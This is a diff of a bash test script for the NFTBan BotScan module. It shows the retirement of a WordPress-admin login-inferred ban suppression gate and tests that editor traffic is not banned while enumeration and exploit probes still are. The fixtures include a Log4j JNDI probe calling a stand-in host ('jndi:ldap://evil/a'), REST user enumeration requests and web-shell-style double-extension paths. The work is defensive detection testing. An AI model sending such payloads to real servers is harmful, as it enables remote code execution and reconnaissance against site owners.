@@ -1,16 +1,16 @@
 #!/usr/bin/env bash
 # =============================================================================
-# NFTBan v1.192.2 - BotScan authenticated WP-admin false-positive context gate
+# NFTBan v1.192.2 -> v1.234.0 - BotScan WP-admin "context gate" RETIRED (generic pattern contract)
 # =============================================================================
 # SPDX-License-Identifier: MPL-2.0
 # SPDX-FileCopyrightText: Copyright (c) 2024-2026 Antonios Voulvoulis <contact@nftban.com>
 #
 # meta:name="botscan_wpadmin_context_gate_v1922_test"
 # meta:type="test"
-# meta:version="1.192.2"
+# meta:version="1.234.0"
 # meta:owner="Antonios Voulvoulis <contact@nftban.com>"
 # meta:created_date="2026-06-17"
-# meta:description="BOTSCAN_WP_AUTHENTICATED_ADMIN_FALSE_POSITIVE: a logged-in WP admin (POST /wp-login.php->302) is NOT banned for the WP REST/admin scanner patterns (EXP_WPREST/WS_WPADMIN) its editor legitimately trips, while unauthenticated enumeration, exploit routes, and no-auth scanners STILL ban. Per-IP CONTEXT gate, not a global pattern weakening. Drives process_entry + analyze directly; pattern path only (404/endpoint-flood disabled); public TEST-NET IPs (RFC1918 is auto-whitelisted)."
+# meta:description="v1.234.0 (BUG-BOTSCAN-WPADMIN-AUTH-CONTEXT-IS-CYCLE-SCOPED-BANS-LOGGED-IN-EDITORS): the v1.192.2 per-IP login-inferred suppression is RETIRED. The WP editor traffic it protected is no longer a pattern hit for ANY client (route-bounded EXP_WPREST counting distinct targets; WS_WPADMIN on the request path only), with or without a login in the same cycle, on IPv4 and IPv6; enumeration and exploit probes still ban with or without a login-looking 302; the retired BOTSCAN_WPADMIN_CONTEXT_GATE knob is inert; a negative control restoring the pre-v1.234 EXP_WPREST record makes the no-login editor ban (the fixture discriminates). Uses the SHIPPED records. Drives process_entry + analyze directly; pattern path only (404/endpoint-flood disabled); public TEST-NET IPs."
 # meta:inventory.files="botscan_wpadmin_context_gate_v1922_test.sh"
 # meta:inventory.binaries="bash,grep"
 # meta:inventory.env_vars="NFTBAN_DATA_DIR,BOTSCAN_PATTERNS_DIR,BOTSCAN_BATCH_SIGNAL_MODE,BOTSCAN_WPADMIN_CONTEXT_GATE"
@@ -31,9 +31,13 @@
 # meta:ta.requires_package="false"
 # =============================================================================
 set -Eeuo pipefail
+# v1.234.0: shipped rules now load from <lib>/data in addition to BOTSCAN_PATTERNS_DIR;
+# this test supplies its OWN isolated record set, so the shipped set is switched off.
+export BOTSCAN_SHIPPED_PATTERNS_DIR=""
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 NFTBAN_LIB_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
+REPO_ROOT="$(cd "$SCRIPT_DIR/../../../.." && pwd)"
 export NFTBAN_LIB_DIR
 PASS=0; FAIL=0
 ok(){ echo "  [PASS] $1"; PASS=$((PASS+1)); }
@@ -44,78 +48,88 @@ export NFTBAN_DATA_DIR="$tmp/data" BOTSCAN_PATTERNS_DIR="$tmp/patterns" NFTBAN_C
        BOTSCAN_STATE_FILE="$tmp/state.db" BOTSCAN_LOG_FILE="$tmp/botscan.log" BOTSCAN_ENABLED=true \
        BOTSCAN_BATCH_SIGNAL_MODE=true BOTSCAN_404_THRESHOLD=999 BOTSCAN_ENDPOINT_FLOOD_ENABLED=false
 mkdir -p "$NFTBAN_DATA_DIR/botguard" "$BOTSCAN_PATTERNS_DIR"
-# Real WP patterns (mirror etc/nftban/patterns.d/botscan) + one exploit pattern.
+# The SHIPPED records under test (never a hand-written copy that could drift), plus one exploit.
+SHIP="$REPO_ROOT/cli/lib/nftban/data"   # v1.234.0: shipped rules are lib data
 {
-  printf 'EXP_WPREST|/wp-json/wp/v2/users|url-get|5|300|1800|true|WP user enumeration\n'
-  printf 'WS_WPADMIN|/wp-admin/.*\\.php.*\\.php|url-any|1|60|7200|true|WP double extension\n'
-  printf 'CVE_LOG4J|jndi:|url-any|1|60|86400|true|Log4j RCE\n'
+  grep -h '^EXP_WPREST|' "$SHIP/botscan_exploit.patterns"
+  grep -h '^WS_WPADMIN|' "$SHIP/botscan_webshell.patterns"
+  grep -h '^CVE_LOG4J|' "$SHIP/botscan_exploit.patterns"
 } > "$BOTSCAN_PATTERNS_DIR/test.patterns"
+[[ "$(grep -c . "$BOTSCAN_PATTERNS_DIR/test.patterns")" -eq 3 ]] || { echo "NOT_EXECUTED: shipped records not found under $SHIP" >&2; exit 2; }
 
 # shellcheck source=/dev/null
 source "$NFTBAN_LIB_DIR/core/nftban_botscan.sh"
 set +e   # driver tolerates non-zero rc from the lib calls; assertions read the signals file
 nftban_botscan_load_config
 nftban_botscan_load_patterns
+[[ "${#_BOTSCAN_PATTERNS[@]}" -eq 3 ]] || { echo "NOT_EXECUTED: loader accepted ${#_BOTSCAN_PATTERNS[@]}/3 shipped records" >&2; exit 2; }
 
 SIG="$NFTBAN_DATA_DIR/botguard/batch_signals.jsonl"
-pe(){ nftban_botscan_process_entry "$@" >/dev/null 2>&1 || true; }   # ip url method status ua
+pe(){ nftban_botscan_process_entry "$@" >/dev/null 2>&1 || true; }   # ip url method status ua (API caller: event at cycle now)
 analyze(){ : > "$SIG"; nftban_botscan_analyze >/dev/null 2>&1 || true; }
 banned(){ grep -q "\"ip\":\"$1\"" "$SIG" 2>/dev/null; }
+UA="Mozilla/5.0 (Mac) Chrome/148"
+editor(){ # the block editor's own traffic: author list + current user polling + admin-ajax with a .php in the query
+  local ip="$1" _
+  for _ in 1 2 3 4 5 6; do
+    pe "$ip" "/wp-json/wp/v2/users/?who=authors&per_page=100" GET 200 "$UA"
+    pe "$ip" "/wp-json/wp/v2/users/me?context=edit" GET 200 "$UA"
+  done
+  pe "$ip" "/wp-admin/admin-ajax.php?f=skin.php" GET 200 "$UA"
+}
 
-# ---- one cycle, gate ENABLED, all cases (distinct public IPs) ----
-export BOTSCAN_WPADMIN_CONTEXT_GATE=true
 nftban_botscan_init_state
-# A = AUTHENTICATED admin: successful login 302 + editor EXP_WPREST x5 + WS_WPADMIN x1
-pe 198.51.100.1 "/wp-login.php?redirect_to=/wp-admin/" POST 302 "Mozilla/5.0 (Mac) Chrome/148"
-for _ in 1 2 3 4 5; do pe 198.51.100.1 "/wp-json/wp/v2/users/?who=authors" GET 200 "Mozilla/5.0 (Mac) Chrome/148"; done
-pe 198.51.100.1 "/wp-admin/admin-ajax.php?f=skin.php" GET 200 "Mozilla/5.0 (Mac) Chrome/148"
-# B = UNAUTHENTICATED REST enumeration: EXP_WPREST x5, no login
-for _ in 1 2 3 4 5; do pe 198.51.100.2 "/wp-json/wp/v2/users" GET 200 "python-requests/2.31"; done
-# C = MIXED exploit: authenticated 302 + EXP_WPREST x5 + Log4j probe -> exploit must still ban
-pe 198.51.100.3 "/wp-login.php" POST 302 "Mozilla/5.0 (Mac) Chrome/148"
-for _ in 1 2 3 4 5; do pe 198.51.100.3 "/wp-json/wp/v2/users" GET 200 "Mozilla/5.0 (Mac) Chrome/148"; done
-pe 198.51.100.3 "/?x=jndi:ldap://evil/a" GET 200 "Mozilla/5.0 (Mac) Chrome/148"
-# D = WS_WPADMIN (threshold 1) with NO auth -> must ban (stable UA never auto-exempts)
-pe 198.51.100.4 "/wp-admin/load.php?x=shell.php" GET 404 "Mozilla/5.0 (Mac) Chrome/148"
-# E = AUTHENTICATED admin, ONLY WS_WPADMIN -> suppressed -> no ban
-pe 198.51.100.5 "/wp-login.php" POST 302 "Mozilla/5.0 (Mac) Chrome/148"
-pe 198.51.100.5 "/wp-admin/admin-ajax.php?f=skin.php" GET 200 "Mozilla/5.0 (Mac) Chrome/148"
-# F = normal editor admin-ajax 200 only (no scanner pattern) -> no ban trivially
-pe 198.51.100.6 "/wp-admin/admin-ajax.php" POST 200 "Mozilla/5.0 (Mac) Chrome/148"
-# G = empty-UA scanner doing EXP_WPREST x5, no auth -> bans
-for _ in 1 2 3 4 5; do pe 198.51.100.7 "/wp-json/wp/v2/users" GET 200 "-"; done
-# IPv4/IPv6 parity: the per-IP context gate keys on the source IP, so it must behave
-# identically for IPv6 clients.
-# H = IPv6 AUTHENTICATED admin: 302 login + EXP_WPREST x5 + WS_WPADMIN -> suppressed -> no ban
-pe 2001:db8::1 "/wp-login.php?redirect_to=/wp-admin/" POST 302 "Mozilla/5.0 (Mac) Chrome/148"
-for _ in 1 2 3 4 5; do pe 2001:db8::1 "/wp-json/wp/v2/users/?who=authors" GET 200 "Mozilla/5.0 (Mac) Chrome/148"; done
-pe 2001:db8::1 "/wp-admin/admin-ajax.php?f=skin.php" GET 200 "Mozilla/5.0 (Mac) Chrome/148"
-# I = IPv6 UNAUTHENTICATED WS_WPADMIN (threshold 1), no login -> must ban
-pe 2001:db8::2 "/wp-admin/load.php?x=shell.php" GET 404 "Mozilla/5.0 (Mac) Chrome/148"
+# A  = editor WITH a login 302 in the same cycle            -> no ban (no pattern evidence)
+pe 198.51.100.1 "/wp-login.php?redirect_to=/wp-admin/" POST 302 "$UA"; editor 198.51.100.1
+# A2 = the SAME editor traffic with NO login (IP change)    -> no ban (auth is not needed)
+editor 198.51.100.11
+# B  = enumeration of user IDs, no login                    -> bans
+for i in 1 2 3 4 5; do pe 198.51.100.2 "/wp-json/wp/v2/users/$i" GET 200 "python-requests/2.31"; done
+# B2 = enumeration AFTER a login-looking 302 (lostpassword) -> bans (a 302 grants no trust)
+pe 198.51.100.12 "/wp-login.php?action=lostpassword" POST 302 "$UA"
+for i in 1 2 3 4 5; do pe 198.51.100.12 "/wp-json/wp/v2/users/$i" GET 200 "$UA"; done
+# C  = mixed: login 302 + editor + Log4j probe               -> bans (exploit)
+pe 198.51.100.3 "/wp-login.php" POST 302 "$UA"; editor 198.51.100.3
+pe 198.51.100.3 "/?x=jndi:ldap://evil/a" GET 200 "$UA"
+# D  = double extension in the PATH (threshold 1)           -> bans
+pe 198.51.100.4 "/wp-admin/css/x.php.php" GET 200 "$UA"
+# E  = login 302 + only a .php inside the query              -> no ban (not a double extension)
+pe 198.51.100.5 "/wp-login.php" POST 302 "$UA"; pe 198.51.100.5 "/wp-admin/admin-ajax.php?f=skin.php" GET 200 "$UA"
+# H/I = IPv6 parity
+editor 2001:db8::1
+for i in 1 2 3 4 5; do pe 2001:db8::2 "/?rest_route=/wp/v2/users/$i" GET 200 "$UA"; done
 analyze
 
-echo "=== gate ENABLED ==="
-banned 198.51.100.1 && bad "A authenticated admin BANNED (FP not suppressed)" || ok "A authenticated WP admin NOT banned (EXP_WPREST+WS_WPADMIN suppressed)"
-banned 198.51.100.2 && ok "B unauthenticated /wp-json enumeration STILL bans" || bad "B unauth enumeration not banned"
-banned 198.51.100.3 && ok "C mixed exploit (admin+Log4j) STILL bans (exploit not suppressed)" || bad "C mixed exploit not banned"
-banned 198.51.100.4 && ok "D WS_WPADMIN no-auth STILL bans (stable UA never auto-exempts)" || bad "D no-auth WS_WPADMIN not banned"
-banned 198.51.100.5 && bad "E authenticated WS_WPADMIN-only BANNED" || ok "E authenticated admin (WS_WPADMIN only) NOT banned"
-banned 198.51.100.6 && bad "F normal admin-ajax BANNED" || ok "F normal admin-ajax (no scanner pattern) NOT banned"
-banned 198.51.100.7 && ok "G empty-UA scanner STILL bans" || bad "G empty-UA scanner not banned"
-banned 2001:db8::1 && bad "H IPv6 authenticated admin BANNED (context gate not family-neutral)" || ok "H IPv6 authenticated admin NOT banned (gate suppresses for IPv6 too)"
-banned 2001:db8::2 && ok "I IPv6 no-auth WS_WPADMIN STILL bans (enforcement family-neutral)" || bad "I IPv6 no-auth scanner not banned"
+echo "=== v1.234.0: generic contract, gate retired ==="
+banned 198.51.100.1  && bad "A editor (login this cycle) BANNED"            || ok "A editor with a login this cycle NOT banned"
+banned 198.51.100.11 && bad "A2 editor with NO login BANNED (auth dependency)" || ok "A2 identical editor traffic with NO login NOT banned (no auth dependency)"
+banned 198.51.100.2  && ok "B enumeration of user IDs bans"                 || bad "B enumeration not banned"
+banned 198.51.100.12 && ok "B2 enumeration after a login-looking 302 still bans (no inferred trust)" || bad "B2 enumeration after 302 NOT banned (inferred trust survived)"
+banned 198.51.100.3  && ok "C mixed exploit (editor + Log4j) bans"          || bad "C mixed exploit not banned"
+banned 198.51.100.4  && ok "D double extension in the path bans"           || bad "D path double extension not banned"
+banned 198.51.100.5  && bad "E .php inside the query treated as a double extension" || ok "E a .php in the query string is not a double extension"
+banned 2001:db8::1   && bad "H IPv6 editor BANNED"                          || ok "H IPv6 editor NOT banned"
+banned 2001:db8::2   && ok "I IPv6 rest_route enumeration bans"             || bad "I IPv6 enumeration not banned"
 
-# ---- discriminator: gate DISABLED -> case A bans (proves the gate is what suppresses) ----
-export BOTSCAN_WPADMIN_CONTEXT_GATE=false
+# ---- the retired knob is inert: enabling it changes nothing ----
+export BOTSCAN_WPADMIN_CONTEXT_GATE=true BOTSCAN_WPADMIN_CONTEXT_PATTERNS="EXP_WPREST WS_WPADMIN"
 nftban_botscan_init_state
-pe 198.51.100.1 "/wp-login.php?redirect_to=/wp-admin/" POST 302 "Mozilla/5.0 (Mac) Chrome/148"
-for _ in 1 2 3 4 5; do pe 198.51.100.1 "/wp-json/wp/v2/users/?who=authors" GET 200 "Mozilla/5.0 (Mac) Chrome/148"; done
-pe 198.51.100.1 "/wp-admin/admin-ajax.php?f=skin.php" GET 200 "Mozilla/5.0 (Mac) Chrome/148"
+pe 198.51.100.12 "/wp-login.php" POST 302 "$UA"
+for i in 1 2 3 4 5; do pe 198.51.100.12 "/wp-json/wp/v2/users/$i" GET 200 "$UA"; done
 analyze
-echo "=== discriminator: gate DISABLED ==="
-banned 198.51.100.1 && ok "A bans when gate disabled (pre-fix behavior reproduced — fixture discriminates)" || bad "A did not ban even with gate disabled"
+banned 198.51.100.12 && ok "K BOTSCAN_WPADMIN_CONTEXT_GATE=true is inert (enumeration after login still bans)" || bad "K retired gate knob still suppresses"
+unset BOTSCAN_WPADMIN_CONTEXT_GATE BOTSCAN_WPADMIN_CONTEXT_PATTERNS
+
+# ---- negative control: the pre-v1.234 EXP_WPREST record makes the no-login editor ban ----
+printf 'EXP_WPREST|/wp-json/wp/v2/users|url-get|5|300|1800|true|pre-v1.234 record (negative control)\n' > "$BOTSCAN_PATTERNS_DIR/zz_negative_control.patterns"
+nftban_botscan_load_patterns
+nftban_botscan_init_state
+editor 198.51.100.11
+analyze
+banned 198.51.100.11 && ok "NC pre-v1.234 record bans the no-login editor (fixture discriminates)" || bad "NC old record did not ban — the A2 arm has no power"
 
 echo ""
-echo "=== botscan wp-admin context gate v1.192.2: PASS=$PASS FAIL=$FAIL ==="
+echo "=== botscan wp-admin gate retired / generic contract v1.234.0: PASS=$PASS FAIL=$FAIL ==="
+[[ "$PASS" -eq 11 ]] || { echo "INCOMPLETE: $PASS/11 assertions passed or ran" >&2; exit 1; }
 [[ "$FAIL" -eq 0 ]] || exit 1
 exit 0
